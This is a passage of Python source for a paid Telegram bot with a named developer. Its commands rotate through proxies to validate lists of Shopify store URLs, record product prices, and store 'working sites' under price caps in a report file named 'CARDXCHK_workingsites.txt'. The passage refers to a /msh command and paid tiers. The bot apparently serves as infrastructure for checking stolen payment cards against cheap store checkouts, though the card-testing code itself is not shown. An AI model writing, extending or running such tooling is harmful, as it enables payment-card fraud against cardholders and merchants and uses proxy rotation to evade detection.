        if retry_count < 3:
            new_proxy_index = (proxy_index + 1) % len(HARDCODED_PROXIES)
            logger.info(f"Retrying {site_url} with different proxy due to timeout (attempt {retry_count + 1})")
            return await test_site(site_url, user_id, new_proxy_index, retry_count + 1)
        
        return False, "Timeout", ""
    except aiohttp.ClientError as e:
        logger.info(f"Connection error testing {site_url} with proxy {proxy}: {str(e)}")
        # Retry with a different proxy if we haven't reached max retries
        if retry_count < 3:
            new_proxy_index = (proxy_index + 1) % len(HARDCODED_PROXIES)
            logger.info(f"Retrying {site_url} with different proxy due to connection error (attempt {retry_count + 1})")
            return await test_site(site_url, user_id, new_proxy_index, retry_count + 1)
        
        return False, f"Connection error: {str(e)}", ""
    except ValueError as e:
        logger.info(f"JSON decode error testing {site_url}: {str(e)}")
        return False, f"JSON decode error: {str(e)}", ""
    except Exception as e:
        logger.error(f"Unexpected error testing site {site_url}: {str(e)}")
        return False, f"Unexpected error: {str(e)}", ""
        
async def test_sites_batch(
    sites: List[str], 
    user_id: int, 
    progress_callback=None,
    working_site_callback: Optional[Callable[[str, str], None]] = None
) -> Dict[str, Tuple[bool, str, str]]:
    """
    Test a batch of sites and return results.
    
    Args:
        sites: List of site URLs to test
        user_id: ID of the user (for getting proxies)
        progress_callback: Optional callback function to update progress
        working_site_callback: Optional callback function to handle working sites immediately
        
    Returns:
        Dictionary with site URLs as keys and (is_working, response_text, price) as values
    """
    results = {}
    total_sites = len(sites)
    tested_sites = 0
    working_sites = 0
    dead_sites = 0
    
    # Create a semaphore to limit concurrent requests (reduced to 3 to avoid timeouts)
    semaphore = asyncio.Semaphore(15)
    
    # Track which proxy index to use for each site
    proxy_index = 0
    
    async def test_with_semaphore(site_url):
        nonlocal tested_sites, working_sites, dead_sites, proxy_index
        async with semaphore:
            # Use a different proxy for each site based on current index
            current_proxy_index = proxy_index
            proxy_index = (proxy_index + 1) % len(HARDCODED_PROXIES)  # Increment for next site
            
            result = await test_site(site_url, user_id, current_proxy_index)
            tested_sites += 1
            
            # Update counters
            if result[0]:  # is_working
                working_sites += 1
                # Immediately handle working site if callback provided
                if working_site_callback:
                    try:
                        domain = extract_domain_from_url(site_url)
                        # Call the callback with the domain and price
                        await working_site_callback(domain, result[2])
                        logger.info(f"Processed working site {domain} with callback")
                    except Exception as e:
                        logger.error(f"Error in working_site_callback: {str(e)}")
            else:
                dead_sites += 1
            
            # Update progress if callback provided (every 50 sites or when all done)
            if progress_callback and (tested_sites % 20 == 0 or tested_sites == total_sites):
                await progress_callback(tested_sites, total_sites, working_sites, dead_sites)
            
            return site_url, result
    
    # Create tasks for all sites
    tasks = [asyncio.create_task(test_with_semaphore(site_url)) for site_url in sites]
    
    # Process results as they complete
    for task in asyncio.as_completed(tasks):
        try:
            site_url, (is_working, response_text, price) = await task
            results[site_url] = (is_working, response_text, price)
            logger.info(f"Tested site {site_url}: {'Working' if is_working else 'Not working'}")
        except Exception as e:
            logger.error(f"Error processing task result: {str(e)}")
            # Continue processing other tasks even if one fails
    
    return results

async def create_sites_report(test_results: Dict[str, Tuple[bool, str, str]]) -> io.BytesIO:
    """
    Create a text file with site test results in the requested format.
    
    Args:
        test_results: Dictionary with site URLs as keys and (is_working, response_text, price) as values
        
    Returns:
        BytesIO object containing the report
    """
    # Count working sites
    working_count = sum(1 for _, (is_working, _, _) in test_results.items() if is_working)
    
    # Create report content in the requested format
    report_content = f"Total working Sites - {working_count}\n"
    report_content += "═════════════════════════════\n"
    
    # Add working sites with their prices
    for site_url, (is_working, response_text, price) in test_results.items():
        if is_working:
            # Extract domain for the report
            domain = extract_domain_from_url(site_url)
            price_str = f" (${price})" if price else ""
            # Fix: Add curly braces around response text and proper spacing
            report_content += f"{domain}  {{{response_text}}}  {price_str}\n"
    
    # Create BytesIO object with new file name
    report_bytes = io.BytesIO(report_content.encode('utf-8'))
    report_bytes.name = "CARDXCHK_workingsites.txt"
    
    return report_bytes

async def seturl_update_progress_message(context, chat_id, message_id, tested, total, working, dead):
    """
    Update the progress message with working/dead sites progress.
    
    Args:
        context: Telegram context object
        chat_id: Chat ID to update
        message_id: Message ID to update
        tested: Number of sites tested
        total: Total number of sites
        working: Number of working sites found
        dead: Number of dead sites found
    """
    try:
        # Calculate percentage
        percentage = int((tested / total) * 100) if total > 0 else 0
        
        # Format progress message with custom UI showing working/dead progress
        progress_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 📊</pre>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Site Validation
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> 𝐓𝐨𝐭𝚊𝐥 𝐒𝐢𝐭𝐞𝐬 ↬ <code>{total}</code>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> 𝐓𝐞𝐬𝐭𝐞𝐝 ↬ <code>{tested}/{total} ({percentage}%)</code>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>{working}</code>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> ❌ 𝐃𝐞𝐚𝐝 ↬ <code>{dead}</code>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=progress_msg,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Error updating progress message: {str(e)}")

def seturl_extract_urls_from_text(text: str) -> List[str]:
    """
    Extract all URLs from a text using regex and ensure they use HTTPS.
    
    Args:
        text: Text to extract URLs from
        
    Returns:
        List of HTTPS URLs found in the text
    """
    # Regex pattern to match URLs
    url_pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
    urls = re.findall(url_pattern, text)
    
    # Clean up URLs and ensure HTTPS
    cleaned_urls = []
    for url in urls:
        # Remove trailing punctuation
        url = url.rstrip('.,;:!?)')
        
        # Convert to HTTPS if not already
        if url.startswith('http://'):
            url = url.replace('http://', 'https://', 1)
        elif not url.startswith('https://'):
            url = 'https://' + url
        
        # Ensure it's a valid URL
        if url.startswith('https://'):
            cleaned_urls.append(url)
    
    return cleaned_urls

async def _process_seturl_sites(update: Update, context: CallbackContext, sites_to_test: List[str], process_id: str, max_price: int):
    """
    Background task to process sites for /seturl command.
    
    Args:
        update: Telegram update object
        context: Telegram context object
        sites_to_test: List of site URLs to test
        process_id: Unique ID for this process
        max_price: Maximum price to add site to DB
    """
    user_id = update.effective_user.id
    
    # Determine if this is a group chat
    is_group = update.message.chat.type in ['group', 'supergroup']
    
    # Create a progress callback function
    async def progress_callback(tested, total, working, dead):
        try:
            # Get the status message for this specific process
            if process_id in active_processes and "status_message" in active_processes[process_id]:
                await seturl_update_progress_message(
                    context, 
                    update.message.chat_id, 
                    active_processes[process_id]["status_message"].message_id, 
                    tested, 
                    total,
                    working,
                    dead
                )
        except Exception as e:
            logger.error(f"Error in progress callback: {str(e)}")
    
    # Create a set to track sites that were added to DB (based on price filter)
    added_sites_count = 0
    
    # Create a callback function to immediately add working sites to the database
    async def add_working_site_to_db(domain: str, price: str):
        nonlocal added_sites_count
        try:
            # Parse price to float
            current_price = 0
            if price:
                try:
                    price_clean = re.sub(r'[^\d.]', '', price)
                    current_price = float(price_clean)
                except ValueError:
                    current_price = 0
            
            # Only add if price is within the selected range
            if current_price <= max_price:
                if add_user_site(user_id, domain):
                    added_sites_count += 1
                    logger.info(f"Added site {domain} (Price: ${current_price}) to database")
            else:
                logger.info(f"Skipped site {domain} (Price: ${current_price}) - Exceeds max price ${max_price}")
                
        except Exception as e:
            logger.error(f"Error in working site callback for {domain}: {str(e)}")
    
    # Test all sites with both progress callback and working site callback
    test_results = await test_sites_batch(
        sites_to_test, 
        user_id, 
        progress_callback, 
        working_site_callback=add_working_site_to_db
    )
    
    # Extract working sites for report (regardless of price, report shows all found)
    working_sites = []
    
    for site_url, (is_working, response_text, price) in test_results.items():
        if is_working:
            domain = extract_domain_from_url(site_url)
            working_sites.append((domain, price))
    
    # Create report
    report_file = await create_sites_report(test_results)
    
    # Send report to user (DM or group based on chat type)
    try:
        # FIX: Replaced unsafe symbols in links and escaped <=
        caption_text = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙑𝙖𝙡𝙞𝙙𝙖𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚 ✅</pre>
<a href="https://t.me/+7x_7DZGSDCs1ZDBl">⊀</a> ✅ 𝐓𝐨𝐭𝚊𝐥 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>{len(working_sites)}/{len(sites_to_test)}</code>
<a href="https://t.me/+7x_7DZGSDCs1ZDBl">⊀</a> 💾 𝐀𝐝𝐝𝐞𝐝 𝐓𝐨 𝐃𝐁 (0-${max_price}) ↬ <code>{added_sites_count}</code>
<a href="https://t.me/+7x_7DZGSDCs1ZDBl">⊀</a> ❌ 𝐃𝐞𝐚𝐝 ↬ <code>{len(sites_to_test) - len(working_sites)}/{len(sites_to_test)}</code>

<i>Only working sites with price &lt;= ${max_price} have been added to your account.</i>
<a href="https://t.me/+7x_7DZGSDCs1ZDBl">⊀</a> 𝐃𝐞𝐯 ↬ <a href="https://t.me/rev3rsex">@rev3rsex</a>"""

        if is_group:
            # Send to group chat
            await context.bot.send_document(
                chat_id=update.message.chat_id,
                document=report_file,
                caption=caption_text,
                parse_mode="HTML"
            )
        else:
            # Send to user's DM
            await context.bot.send_document(
                chat_id=user_id,
                document=report_file,
                caption=caption_text,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Error sending report to user {user_id}: {str(e)}")
        error_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href="https://t.me/rev3rsex">⊀</a> 𝐄𝐫𝐫𝐨𝐫 ↬ <code>{str(e)}</code>

<i>Failed to send validation report. Please try again.</i>
<a href="https://t.me/rev3rsex">⌬</a> 𝐃𝐞𝐯 ↬ <a href="https://t.me/rev3rsex">@rev3rsex</a>"""
        
        # FIX: Use direct context.bot.send_message to avoid MiniUpdate reply_text crash
        await context.bot.send_message(
            chat_id=update.message.chat_id,
            text=error_msg,
            parse_mode="HTML"
        )
    
    # Delete status message
    try:
        if process_id in active_processes and "status_message" in active_processes[process_id]:
            await context.bot.delete_message(
                chat_id=update.message.chat_id,
                message_id=active_processes[process_id]["status_message"].message_id
            )
            # Remove the process from active_processes
            del active_processes[process_id]
    except Exception as e:
        logger.error(f"Error deleting status message: {str(e)}")
        
async def handle_seturl_command(update: Update, context: CallbackContext):
    """
    Handle the /seturl command for adding user sites.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    logger.info(f"Set URL command received from user {user_id} ({first_name})")
    
    ADMIN_ID = 7742548417
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial" and user_id != ADMIN_ID:
        await update.message.reply_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙙 ⛔</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>This command is only available for users with an active plan.</i>

<i>Upgrade your plan to use site management features.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        logger.info(f"Set URL command denied for trial user {user_id}")
        return
    
    # Check if user provided a URL or a file
    sites_to_test = []
    
    # Check if a document was provided
    if update.message.document and update.message.document.mime_type == "text/plain":
        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        text = file_content.decode('utf-8')
        
        # Extract URLs from the text
        sites_to_test = seturl_extract_urls_from_text(text)
        logger.info(f"Loaded {len(sites_to_test)} sites from file for user {user_id}")
    # Check if sites were provided as text (after the command)
    elif context.args:
        # Get the message text directly to preserve newlines
        message_text = update.message.text
        
        # Remove the command and any leading/trailing whitespace
        if message_text.startswith('/seturl'):
            message_text = message_text[8:].strip()
        
        # Extract URLs from the text
        sites_to_test = seturl_extract_urls_from_text(message_text)
        logger.info(f"Loaded {len(sites_to_test)} sites from message for user {user_id}")
    # Check if there's a reply to a message with sites
    elif update.message.reply_to_message:
        # Check if the replied message has text
        if update.message.reply_to_message.text:
            # Get the text from the replied message
            reply_text = update.message.reply_to_message.text
            sites_to_test = seturl_extract_urls_from_text(reply_text)
            logger.info(f"Loaded {len(sites_to_test)} sites from reply for user {user_id}")
        # Check if the replied message has a document
        elif update.message.reply_to_message.document and update.message.reply_to_message.document.mime_type == "text/plain":
            # Download the file
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            # Extract URLs from the text
            sites_to_test = seturl_extract_urls_from_text(text)
            logger.info(f"Loaded {len(sites_to_test)} sites from replied file for user {user_id}")
    
    # If no sites provided, show the user's current sites
    if not sites_to_test:
        user_sites = get_user_sites(user_id)
        
        if user_sites:
            # Show only the first 3 sites as examples
            example_sites = user_sites[:3]
            sites_list = "\n".join([f"• <code>{site}</code>" for site in example_sites])
            
            if len(user_sites) > 3:
                sites_list += f"\n• <code>... and {len(user_sites) - 3} more</code>"
            
            message = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙔𝙤𝙪𝙧 𝙎𝙞𝙩𝙚𝙨 📋</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝚊𝐥 𝐒𝐢𝐭𝐞𝐬 ↬ <code>{len(user_sites)}</code>

<b>Example sites:</b>
{sites_list}

<b>To add new sites:</b> <code>/seturl https://example.myshopify.com</code>
<b>To remove a site:</b> <code>/delurl https://example.myshopify.com</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        else:
            message = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙉𝙤 𝙎𝙞𝙩𝙚𝙨 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>You don't have any sites configured.</i>

<b>To add sites:</b> <code>/seturl https://example.myshopify.com</code>
<i>Please add at least one site before using the /msh command.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        
        await update.message.reply_text(message, parse_mode="HTML")
        return
    
    # Store sites in pending validations
    PENDING_VALIDATIONS[user_id] = sites_to_test
    
    # Create keyboard for price selection
    keyboard = [
        [
            InlineKeyboardButton("0-5 USD", callback_data=f"seturl_price_5"),
            InlineKeyboardButton("0-10 USD", callback_data=f"seturl_price_10")
        ],
        [
            InlineKeyboardButton("0-20 USD", callback_data=f"seturl_price_20"),
            InlineKeyboardButton("0-40 USD", callback_data=f"seturl_price_40")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙚𝙡𝙚𝙘𝙩 𝙍𝙖𝙣𝙜𝙚 💲</pre>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> 𝐓𝐨𝐭𝚊𝐥 𝐒𝐢𝐭𝐞𝐬 ↬ <code>{len(sites_to_test)}</code>
<i>Select the price range you want to add sites:</i>""",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def handle_seturl_price_callback(update: Update, context: CallbackContext):
    """
    Handle the callback from the price range selection.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    callback_data = query.data
    
    # Determine max price from callback data
    max_price = 0
    if "seturl_price_5" in callback_data:
        max_price = 5
    elif "seturl_price_10" in callback_data:
        max_price = 10
    elif "seturl_price_20" in callback_data:
        max_price = 20
    elif "seturl_price_40" in callback_data:
        max_price = 40
    else:
        await query.edit_message_text("Invalid selection.")
        return
    
    # Check if user has pending sites
    if user_id not in PENDING_VALIDATIONS:
        await query.edit_message_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<i>No sites found or session expired. Please use /seturl again.</i>""",
            parse_mode="HTML"
        )
        return
    
    sites_to_test = PENDING_VALIDATIONS.pop(user_id)
    
    # Generate a unique process ID for this command
    process_id = f"{user_id}_{int(time.time())}"
    
    # Update the callback query message to initial progress
    progress_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 📊</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Site Validation (Max: ${max_price})
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝚊𝐥 𝐒𝐢𝐭𝐞𝐬 ↬ <code>{len(sites_to_test)}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐞𝐬𝐭𝐞𝐝 ↬ <code>0/{len(sites_to_test)} (0%)</code>
<a href='https://t.me/rev3rsex'>⊀</a> ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>0</code>
<a href='https://t.me/rev3rsex'>⊀</a> ❌ 𝐃𝐞𝐚𝐝 ↬ <code>0</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    try:
        # Edit the message instead of deleting and creating new one to keep flow smooth
        status_message = await query.edit_message_text(
            progress_msg,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Error editing message to progress: {e}")
        # Fallback: send new message if edit fails
        status_message = await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=progress_msg,
            parse_mode="HTML"
        )
        
    # Store the process information in the active_processes dictionary
    active_processes[process_id] = {
        "status_message": status_message,
        "user_id": user_id
    }
    
    # Create a mock update object that has all necessary attributes for _process_seturl_sites
    class MiniUpdate:
        def __init__(self, chat_id, user_id, chat_type, ctx):
            self.effective_user = type('obj', (object,), {'id': user_id})()
            
            # Define a fake message object that supports reply_text
            async def mock_reply_text(text, parse_mode=None):
                await ctx.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
            
            self.message = type('obj', (object,), {
                'chat_id': chat_id,
                'chat': type('obj', (object,), {'type': chat_type})(),
                'reply_text': mock_reply_text
            })()

    # Use the chat from the callback query message
    chat_type = query.message.chat.type
    fake_update = MiniUpdate(query.message.chat_id, user_id, chat_type, context)

    # Process sites in background
    asyncio.create_task(_process_seturl_sites(fake_update, context, sites_to_test, process_id, max_price))
async def handle_delurl_command(update: Update, context: CallbackContext):
    """
    Handle the /delurl command for removing user sites.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    logger.info(f"Delete URL command received from user {user_id} ({first_name})")
    
    # Check if user has an active plan (not Trial)
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial" and user_id != 7742548417:
        await update.message.reply_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙙 ⛔</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>This command is only available for users with an active plan.</i>

<i>Upgrade your plan to use site management features.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        logger.info(f"Delete URL command denied for trial user {user_id}")
        return
    
    # Check if user provided a URL
    if not context.args:
        message = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙍𝙚𝙢𝙤𝙫𝙚 𝙎𝙞𝙩𝙚 🗑️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 ↬ <code>/delurl https://example.myshopify.com</code>

<b>To remove all sites:</b> <code>/delall</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        
        await update.message.reply_text(message, parse_mode="HTML")
        return
    
    # Get URL from command arguments
    site_url = context.args[0]
    
    # Extract domain from URL
    domain = extract_domain_from_url(site_url)
    
    # Check if site exists in user's list
    user_sites = get_user_sites(user_id)
    if domain not in user_sites:
        await update.message.reply_text(
            f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Site not found in your list!</i>

<i>This site is not in your list of sites.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        return
    
    # Remove site from user's list
    if remove_user_site(user_id, domain):
        # Get updated list of sites
        user_sites = get_user_sites(user_id)
        
        if user_sites:
            message = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙪𝘾𝙘𝙚𝙨𝙨 ✅</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Site removed successfully!</i>

<a href='https://t.me/rev3rsex'>⊀</a> 𝐑𝐞𝐦𝚊𝐢𝐧𝐢𝐧𝐠 ↬ <code>{len(user_sites)} sites</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        else:
            message = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙪𝘾𝙘𝙚𝙨𝙨 ✅</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Site removed successfully!</i>

<i>You don't have any sites configured. Please add at least one site using /seturl command.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
        
        await update.message.reply_text(message, parse_mode="HTML")
        logger.info(f"User {user_id} removed site: {domain}")
    else:
        await update.message.reply_text(
            f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙀𝙧𝙧𝙤𝙧 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Failed to remove site!</i>

<i>Please try again later.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        logger.error(f"Failed to remove site {domain} for user {user_id}")

async def handle_delall_command(update: Update, context: CallbackContext):
    """
    Handle the /delall command for removing all user sites.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    logger.info(f"Delete all command received from user {user_id} ({first_name})")
    
    # Check if user has an active plan (not Trial)
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial" and user_id != 7742548417:
        await update.message.reply_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙙 ⛔</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>This command is only available for users with an active plan.</i>

<i>Upgrade your plan to use site management features.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        logger.info(f"Delete all command denied for trial user {user_id}")
        return
    
    # Get user's current sites
    user_sites = get_user_sites(user_id)
    
    if not user_sites:
        await update.message.reply_text(
            f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙉𝙤 𝙎𝙞𝙩𝙚𝙨 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>You don't have any sites configured.</i>

<i>There are no sites to remove.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
            parse_mode="HTML"
        )
        return
    
    # Create confirmation keyboard
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, delete all", callback_data=f"delall_confirm_{user_id}"),
            InlineKeyboardButton("❌ No, cancel", callback_data="delall_cancel")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝘾𝙤𝙣𝙛𝙞𝙧𝙢 𝘾𝙚𝙡𝙚𝙩𝙞𝙤𝙣 ⚠️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ↬ <i>Are you sure you want to delete all {len(user_sites)} sites?</i>

<i>This action cannot be undone.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def _process_resites_sites(update: Update, context: CallbackContext, process_id: str):
    """
    Background task to process sites for /resites command.
    
    Args:
        update: Telegram update object
        context: Telegram context object
        process_id: Unique ID for this process
    """
    user_id = update.effective_user.id
    
    # Get user's current sites
    user_sites = get_user_sites(user_id)
    
    # Determine if this is a group chat
    is_group = update.message.chat.type in ['group', 'supergroup']
    
    # Create a progress callback function
    async def progress_callback(tested, total, working, dead):
        try:
            # Get the status message for this specific process
            if process_id in active_processes and "status_message" in active_processes[process_id]:
                await seturl_update_progress_message(
                    context, 
                    update.message.chat_id, 
                    active_processes[process_id]["status_message"].message_id, 
                    tested, 
                    total,
                    working,
                    dead
                )
        except Exception as e:
            logger.error(f"Error in progress callback: {str(e)}")
    
    # Create a set to track sites that were already in the database
    existing_sites = set(user_sites)
    
    # Create a set to track working sites
    working_sites_set = set()
    
    # Create a callback function to immediately add working sites to the database
    async def add_working_site_to_db(domain: str, price: str):
        try:
            # Add the working site to our tracking set
            working_sites_set.add(domain)
            
            # The site was already in the database (we're just revalidating),
            # so we don't need to add it again yet
            logger.info(f"Marked site {domain} as working")
        except Exception as e:
            logger.error(f"Error in working site callback for {domain}: {str(e)}")
    
    # Test all sites with both progress callback and working site callback
    test_results = await test_sites_batch(
        user_sites, 
        user_id, 
        progress_callback,
        working_site_callback=add_working_site_to_db
    )
    
    # Remove all sites first
    remove_all_user_sites(user_id)
    
    # Add only working sites back to database
    if working_sites_set:
        add_working_sites(user_id, list(working_sites_set))
        logger.info(f"Re-added {len(working_sites_set)} working sites to database")
    
    # Extract working sites with their prices for report
    working_sites = []
    
    for site_url, (is_working, response_text, price) in test_results.items():
        if is_working:
            domain = extract_domain_from_url(site_url)
            working_sites.append((domain, price))
    
    # Create report
    report_file = await create_sites_report(test_results)
    
    # Send report to user (DM or group based on chat type)
    try:
        if is_group:
            # Send to group chat
            await context.bot.send_document(
                chat_id=update.message.chat_id,
                document=report_file,
                caption=f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙍𝚎𝙫𝚊𝙡𝙞𝙙𝚊𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝚎𝙩𝚎 ✅</pre>
<a href='https://t.me/rev3rsex'>⊀</a> ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 ↬ <code>{len(working_sites)}/{len(user_sites)}</code>
<a href='https://t.me/rev3rsex'>⊀</a> ❌ 𝐃𝐞𝐚𝐝 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 ↬ <code>{len(user_sites) - len(working_sites)}/{len(user_sites)}</code>

<i>Only working sites (with prices between $0-$40) have been kept in your account.</i>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>""",
                parse_mode="HTML"
            )
        else:
            # Send to user's DM
            await context.bot.send_document(
                chat_id=user_id,
                document=report_file,
                caption=f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙍𝚎𝙫𝚊𝙡𝙞𝙙𝚊𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝚎𝙩𝚎 ✅</pre>
